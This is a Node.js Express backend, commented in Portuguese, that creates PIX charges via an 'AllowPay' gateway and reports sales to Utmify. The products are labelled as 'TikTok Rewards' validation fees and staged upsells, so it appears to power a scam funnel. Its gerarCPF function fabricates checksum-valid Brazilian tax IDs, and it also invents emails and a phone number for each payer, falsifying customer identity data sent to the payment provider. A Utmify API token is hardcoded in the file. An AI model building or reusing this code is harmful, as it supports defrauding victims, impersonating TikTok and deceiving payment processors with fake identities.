// server.js — Backend AllowPay PIX para Vercel com Integração Utmify
const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

const ALLOWPAY_BASE = 'https://allow-gi0i.onrender.com';
const UTMIFY_TOKEN = '7GV8qIgl6tPmcGq009MT48SUcVgz7QPdRvNp';

// Banco de dados temporário na memória para guardar os dados do cliente e UTMs de transações pendentes
// Assim, quando receber a aprovação, podemos disparar para a Utmify os dados corretos do cliente e rastreamento.
const transacoesTemp = new Map();

// ─── Gera CPF matematicamente válido ───────────────────────────────────────
function gerarCPF() {
  const n = Array.from({ length: 9 }, () => Math.floor(Math.random() * 9));

  let s1 = 0;
  for (let i = 0; i < 9; i++) s1 += n[i] * (10 - i);
  const d1 = s1 % 11 < 2 ? 0 : 11 - (s1 % 11);

  let s2 = 0;
  for (let i = 0; i < 9; i++) s2 += n[i] * (11 - i);
  s2 += d1 * 2;
  const d2 = s2 % 11 < 2 ? 0 : 11 - (s2 % 11);

  return [...n, d1, d2].join('');
}

// ─── Dispara evento para a Utmify ──────────────────────────────────────────
async function enviarParaUtmify(dadosVenda) {
  try {
    console.log('[Utmify] Enviando evento para Utmify. Status:', dadosVenda.status, '| ID:', dadosVenda.orderId);
    
    const payload = {
      orderId: dadosVenda.orderId,
      platform: 'TikTok Rewards',
      paymentMethod: 'pix',
      status: dadosVenda.status, // "waiting_payment" ou "paid"
      createdAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
      approvedDate: dadosVenda.status === 'paid' ? new Date().toISOString().replace('T', ' ').substring(0, 19) : null,
      customer: {
        name: dadosVenda.customer.name,
        email: dadosVenda.customer.email,
        phone: dadosVenda.customer.phone,
        document: dadosVenda.customer.taxId
      },
      products: [
        {
          id: 'tkt_rewards_upsell',
          name: dadosVenda.productName || 'Taxa TikTok Rewards',
          price: dadosVenda.amountCents / 100,
          priceInCents: dadosVenda.amountCents,
          planId: 'plan_tkt_rewards',
          planName: 'Plano TikTok Rewards',
          quantity: 1
        }
      ],
      commission: {
        totalPriceInCents: dadosVenda.amountCents,
        gatewayFeeInCents: Math.round(dadosVenda.amountCents * 0.05), // simulado
        userCommissionInCents: Math.round(dadosVenda.amountCents * 0.95) // líquido
      },
      trackingParameters: {
        src: dadosVenda.tracking.src || null,
        utm_source: dadosVenda.tracking.utm_source || null,
        utm_medium: dadosVenda.tracking.utm_medium || null,
        utm_campaign: dadosVenda.tracking.utm_campaign || null,
        utm_content: dadosVenda.tracking.utm_content || null,
        utm_term: dadosVenda.tracking.utm_term || null
      }
    };

    const resp = await fetch('https://api.utmify.com.br/api-credentials/orders', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-api-token': UTMIFY_TOKEN
      },
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(10000)
    });

    if (!resp.ok) {
      const errText = await resp.text();
      console.error('[Utmify] Erro ao enviar dados de venda:', resp.status, errText);
    } else {
      console.log('[Utmify] Evento enviado com sucesso! Status:', dadosVenda.status);
    }
  } catch (err) {
    console.error('[Utmify] Exceção ao enviar para Utmify:', err);
  }
}

// ─── POST /api/pix/gerar ───────────────────────────────────────────────────
app.post('/api/pix/gerar', async (req, res) => {
  try {
    const apiKey = process.env.ALLOWPAY_API_KEY;
    if (!apiKey) {
      return res.status(500).json({
        error: 'Chave de API não configurada no servidor. Adicione ALLOWPAY_API_KEY nas variáveis da Vercel.'
      });
    }

    const { 
      nome, 
      amount,
      produto, // Nome do produto configurado no front-end (ex: 'front', 'back', 'up1', 'up2'...)
      utm_source,
      utm_medium,
      utm_campaign,
      utm_content,
      utm_term,
      src
    } = req.body;

    if (!nome || nome.trim().split(/\s+/).length < 2) {
      return res.status(400).json({ error: 'Nome completo (nome e sobrenome) é obrigatório.' });
    }

    // Converte centavos — frontend envia centavos ou usa padrão 1937
    const amountCents = Number(amount) || 1937;
    const customerEmail = `user${Date.now()}@mail.com`;
    const customerPhone = '11999999999';
    const customerCpf = gerarCPF();
    const nomeProduto = produto ? produto.trim() : 'Taxa de Validação';

    const payload = {
      api_key: apiKey,
      amount: amountCents,
      description: nomeProduto, // Passa o nome do produto dinâmico para a AllowPay
      customer: {
        name: nome.trim(),
        email: customerEmail,
        cellphone: customerPhone,
        taxId: customerCpf
      }
    };

    console.log('[AllowPay] Gerando PIX para:', nome, '| Valor:', amountCents, 'centavos | Produto:', nomeProduto);

    const resp = await fetch(`${ALLOWPAY_BASE}/api/v2/allowpay-seller/create-pix`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(30000) // 30s timeout
    });

    const data = await resp.json();

    if (!resp.ok) {
      console.error('[AllowPay] Erro create-pix:', resp.status, data);
      return res.status(resp.status).json({
        error: data.error || `Erro ${resp.status} ao criar PIX. Tente novamente.`
      });
    }

    if (!data.txid || !data.pix_code) {
      console.error('[AllowPay] Resposta incompleta:', data);
      return res.status(500).json({ error: 'Resposta inválida do gateway. Tente novamente.' });
    }

    console.log('[AllowPay] PIX criado! txid:', data.txid, '| route:', data.route);

    // Estrutura de dados da venda para o rastreio da Utmify
    const dadosVenda = {
      orderId: data.txid,
      amountCents,
      productName: nomeProduto, // Passa o nome do produto dinâmico para a Utmify
      status: 'waiting_payment',
      customer: {
        name: nome.trim(),
        email: customerEmail,
        phone: customerPhone,
        taxId: customerCpf
      },
      tracking: {
        utm_source,
        utm_medium,
        utm_campaign,
        utm_content,
        utm_term,
        src
      }
    };

    // Salva na memória temporária para uso posterior na aprovação
    transacoesTemp.set(data.txid, dadosVenda);

    // Envia venda pendente (waiting_payment) de forma assíncrona para a Utmify
    enviarParaUtmify(dadosVenda);

    return res.json({
      txid: data.txid,
      route: data.route,
      pix_code: data.pix_code,
      pix_qr_code: data.pix_qr_code || null
    });

  } catch (err) {
    console.error('[AllowPay] Exceção em /api/pix/gerar:', err);
    if (err.name === 'TimeoutError') {
      return res.status(504).json({ error: 'Gateway demorou demais para responder. Tente novamente.' });
    }
    return res.status(500).json({ error: 'Erro interno no servidor. Tente novamente.' });
  }
});

// ─── POST /api/pix/status ──────────────────────────────────────────────────
app.post('/api/pix/status', async (req, res) => {
  try {
    const apiKey = process.env.ALLOWPAY_API_KEY;
    if (!apiKey) {
      return res.status(500).json({ error: 'Chave de API não configurada.' });
    }

    const { txid, route } = req.body;

    if (!txid || !route) {
      return res.status(400).json({ error: 'txid e route são obrigatórios.' });
    }

    const resp = await fetch(
      `${ALLOWPAY_BASE}/api/v2/allowpay-seller/payment-status/${txid}?route=${route}`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ api_key: apiKey }),
        signal: AbortSignal.timeout(15000)
      }
    );

    const data = await resp.json();

    if (!resp.ok) {
      console.error('[AllowPay] Erro payment-status:', resp.status, data);
      return res.status(resp.status).json({
        error: data.error || `Erro ${resp.status} ao consultar status.`
      });
    }

    // Se o pagamento foi aprovado, dispara a venda paga ('paid') para a Utmify
    if (data.status === 'approved') {
      const dadosVenda = transacoesTemp.get(txid);
      if (dadosVenda && dadosVenda.status !== 'paid') {
        dadosVenda.status = 'paid';
        transacoesTemp.set(txid, dadosVenda); // atualiza estado local
        enviarParaUtmify(dadosVenda); // envia webhook de venda paga para a Utmify
      }
    }

    return res.json({ status: data.status });

  } catch (err) {
    console.error('[AllowPay] Exceção em /api/pix/status:', err);
    return res.status(500).json({ error: 'Erro ao consultar status. Tente novamente.' });
  }
});

// ─── Healthcheck ───────────────────────────────────────────────────────────
app.get('/api/health', (req, res) => res.json({ ok: true }));

module.exports = app;
